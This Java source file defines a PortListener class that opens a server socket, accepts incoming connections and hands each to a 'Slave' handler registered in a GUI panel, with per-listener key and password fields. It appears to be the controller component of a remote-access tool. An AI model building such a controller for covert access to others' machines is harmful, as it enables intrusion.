package com.redpois0n.net;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import com.redpois0n.Slave;
import com.redpois0n.ui.panels.PanelMainSockets;


public class PortListener implements Runnable {

	public static List<PortListener> servers = new ArrayList<PortListener>();
	
	private ServerSocket server;
	private int timeout = 15 * 1000;
	private boolean listening = false;
	private String key;
	private String pass;
	private String name;
	
	public ServerSocket getServer() {
		return server;
	}

	public int getTimeout() {
		return timeout;
	}

	public boolean isListening() {
		return listening;
	}

	public String getKey() {
		return key;
	}

	public String getPass() {
		return pass;
	}

	public String getName() {
		return name;
	}
	
	public PortListener(String name, int port, int timeout, String key, String pass) throws Exception {
		this.name = name;
		this.timeout = timeout;
		this.server = new ServerSocket(port);
		this.key = key;
		this.pass = pass;
		servers.add(this);
	}
	
	@Override
	public void run() {
		try {
			while (!server.isClosed()) {
				Socket socket = server.accept();
				
				new Slave(this, socket);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void start() {
		PanelMainSockets.instance.getModel().addRow(new Object[] { name, server.getLocalPort(), timeout, pass, key});
		
		new Thread(this, "Port " + server.getLocalPort()).start();
	}

	public static PortListener getConnection(String name, int port, int timeout, String key, String pass) {
		for (int i = 0; i < servers.size(); i++) {
			PortListener con = servers.get(i);
			if (con.name.equals(name) && con.key.equals(key) && con.pass.equals(pass) && con.getServer().getLocalPort() == port && con.getTimeout() == timeout) {
				return con;
			}
		}
		
		return null;
	}

}
